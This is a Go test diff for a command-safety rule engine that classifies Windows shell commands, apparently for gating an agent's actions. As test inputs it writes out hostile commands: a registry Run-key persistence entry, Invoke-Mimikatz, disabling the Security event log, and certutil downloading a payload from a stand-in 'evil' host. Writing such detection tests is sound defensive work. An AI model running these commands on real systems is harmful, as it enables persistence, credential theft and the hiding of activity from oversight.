@@ -330,6 +330,115 @@ func TestEvaluateBuiltins_WithRule(t *testing.T) {
 	}
 }
 
+func TestEvaluateBuiltins_WindowsRegAddGeneralRunBoundary(t *testing.T) {
+	idx := BuildRuleIndex(BuiltinRules)
+
+	match := EvaluateBuiltins(`reg add HKCU\Software\Runtime /v Evil /d calc.exe`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected match for reg add Runtime")
+	}
+	if match.RuleID != "builtin:windows:reg-add-general" {
+		t.Fatalf("expected reg-add-general for Runtime path, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionCaution {
+		t.Fatalf("expected CAUTION for reg-add-general, got %q", match.Decision)
+	}
+
+	match = EvaluateBuiltins(`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /d calc.exe`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected match for reg add Run key")
+	}
+	if match.RuleID != "builtin:windows:reg-run-key" {
+		t.Fatalf("expected reg-run-key for Run path, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionApproval {
+		t.Fatalf("expected APPROVAL for reg-run-key, got %q", match.Decision)
+	}
+}
+
+func TestEvaluateBuiltins_WindowsMshtaGeneralExcludesJavascript(t *testing.T) {
+	idx := BuildRuleIndex(BuiltinRules)
+	match := EvaluateBuiltins(`mshta javascript:alert(1)`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected mshta javascript invocation to match a builtin rule")
+	}
+	if match.RuleID == "builtin:windows:mshta-general" {
+		t.Fatalf("mshta javascript should not match mshta-general, got %q", match.RuleID)
+	}
+	if match.RuleID != "builtin:windows:mshta-remote" {
+		t.Fatalf("expected mshta-remote for javascript payload, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionApproval {
+		t.Fatalf("expected APPROVAL for mshta javascript payload, got %q", match.Decision)
+	}
+}
+
+func TestEvaluateBuiltins_WindowsHighRiskSecurityRules(t *testing.T) {
+	idx := BuildRuleIndex(BuiltinRules)
+
+	match := EvaluateBuiltins(`Invoke-Mimikatz`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected Invoke-Mimikatz to match a builtin rule")
+	}
+	if match.RuleID != "builtin:windows:invoke-mimikatz" {
+		t.Fatalf("expected invoke-mimikatz rule, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionApproval {
+		t.Fatalf("expected APPROVAL for Invoke-Mimikatz, got %q", match.Decision)
+	}
+
+	match = EvaluateBuiltins(`wevtutil sl Security /e:false`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected wevtutil sl /e:false to match a builtin rule")
+	}
+	if match.RuleID != "builtin:windows:wevtutil-set-log" {
+		t.Fatalf("expected wevtutil-set-log rule, got %q", match.RuleID)
+	}
+	if match.Decision != core.DecisionBlocked {
+		t.Fatalf("expected BLOCKED for disabling event log channel, got %q", match.Decision)
+	}
+}
+
+func TestWindowsCertutilGeneralPredicateExcludesDecodeAndUrlcache(t *testing.T) {
+	var certutilGeneral BuiltinRule
+	found := false
+	for _, r := range BuiltinRules {
+		if r.ID == "builtin:windows:certutil-general" {
+			certutilGeneral = r
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Fatal("builtin:windows:certutil-general not found")
+	}
+	if certutilGeneral.Predicate == nil {
+		t.Fatal("builtin:windows:certutil-general predicate is nil")
+	}
+
+	if certutilGeneral.Predicate(`certutil -decode payload.b64 payload.exe`) {
+		t.Fatal("decode invocation must be excluded from certutil-general")
+	}
+	if certutilGeneral.Predicate(`certutil -urlcache -split -f https://evil/payload.exe payload.exe`) {
+		t.Fatal("urlcache invocation must be excluded from certutil-general")
+	}
+	if certutilGeneral.Predicate(`certutil -hashfile payload.exe SHA256`) {
+		t.Fatal("allow-listed safe hashfile invocation must be excluded from certutil-general")
+	}
+	if !certutilGeneral.Predicate(`certutil -encode payload.bin payload.b64`) {
+		t.Fatal("non-safe, non-decode certutil invocation should match certutil-general")
+	}
+
+	idx := BuildRuleIndex(BuiltinRules)
+	match := EvaluateBuiltins(`certutil -decode payload.b64 payload.exe`, nil, nil, nil, idx)
+	if match == nil {
+		t.Fatal("expected decode invocation to match a builtin rule")
+	}
+	if match.RuleID != "builtin:windows:certutil-decode" {
+		t.Fatalf("expected certutil-decode, got %q", match.RuleID)
+	}
+}
+
 func TestEvaluateBuiltins_TagOverrideDryRun(t *testing.T) {
 	saved := BuiltinRules
 	defer func() { BuiltinRules = saved }()
